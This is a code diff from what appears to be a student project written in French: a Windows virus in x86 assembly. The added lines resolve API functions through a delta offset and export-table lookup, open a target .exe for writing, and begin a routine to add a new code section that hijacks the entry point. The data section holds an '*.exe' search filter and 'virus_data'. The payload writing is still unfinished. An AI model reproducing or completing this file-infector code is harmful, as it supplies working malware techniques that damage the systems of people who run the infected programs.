@@ -82,6 +82,74 @@ deltaoffset:
     ; code ira
     ; OU retourner NULL
 
+    ; Get CreateFile addr
+    mov     eax,ebp
+    add     eax,offset CreateFile_b
+    sub     eax,offset deltaoffset
+    push    eax ; Address of the func name
+    push    edi ; PE header
+    push    esi ; DOS header
+    call    ent_get_function_addr
+    nop
+    nop
+
+    ; Open a file (eax)
+    push    0 ; attr template
+    push    FILE_ATTRIBUTE_NORMAL
+    push    OPEN_EXISTING
+    push    0 ; default security
+    push    0 ; do not share
+    push    GENERIC_WRITE
+    mov     ebx,ebp
+    add     ebx,offset testFile
+    sub     ebx,offset deltaoffset
+    push    ebx ; .exe path
+    call    eax ; CreateFile()
+
+    call exit_success ; WIP
+   
+    ; Create a new section
+    push    eax ; File descriptor for donothing_2.exe
+    push    ebx ; Delta offset
+    push    edi ; PE header
+    push    esi ; DOS header
+    call new_code_section
+    
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; Create a new code section in the executable
+; Return the old entry point (to resume execution after our payload) or 0
+; 3 params:
+;   pointer to the DOS header -> ebp + 8
+;   pointer to the PE header -> ebp + 12
+;   address of the delta offset -> ebp + 16
+;   file descriptor to a .exe (r+w) -> ebp + 20
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+new_code_section:
+
+    ; Set up a stack frame
+    push    ebp
+    mov     ebp,esp
+    ; Saves context
+    push    ebx
+    push    esi
+    push    edi
+
+    ; TODO
+
+    ; cleanup/return
+    pop     edi
+    pop     esi
+    pop     ebx
+    mov     esp,ebp
+    pop     ebp
+    ret     16
+
+
+
+
+
+
+
     ; TODO: si retourne NULL, pour le moment, on annule
     ; et passe a la suite
     ; sinon, writefile le code malveillant
@@ -243,11 +311,9 @@ ent_next_name:
 
     push    ecx             ; Save edx
     push    edx             ; Save edx
-    ; un/comment to hide/see all the available functions
-    ;push    ebx
-    ;call    output_str
-    ;push    ebx
-    ;call    output_addr
+    nop
+    nop ; Markers for debugging
+    nop
     push    ebx
     push    esi
     call    strcmp_
@@ -431,6 +497,8 @@ exit_fail:
     call    eax
 
 ; All the virus data: use delta offset
+; @MARC: ca ne peut pas marcher sauf si tu 
+; force la zone en r/w avec mprotect?
 virus_data:
    filetime struct
        dwLowDateTime     DWORD     ?
@@ -454,18 +522,13 @@ virus_data:
    ;win32_find_data WIN32_FIND_DATAA <?>
    FileHandleFind  dd ?
    filter          db "*.exe",0
-
-    ;WndTextOut1 db  "Address: 0x"
-    ;WndTextOut2 db  8 dup (66), 13, 10
-    ;WndTextFmt  db  "%08x",0
-    ;Error       db  "Error",0
-    ;NewLine     db  "  ",0
-    ;exportName  db  "ExitProcess",0
+   testFile        db "C:\Users\Benjamin\Documents\GitHub\donothing\TP0\donothing_2.exe",0
+   testStr         db "bite",0
 
    FindFirstFile_b db  "FindFirstFileA",0
    ExitProcess_b   db  "ExitProcess",0
-   ExitProcess_f   dd  0
    Beep_b          db  "Beep",0
-   Beep_f          dd  0
+   CreateFile_b    db  "CreateFileA",0
+   WriteFIle_b     db  "WriteFile",0
 
 end start
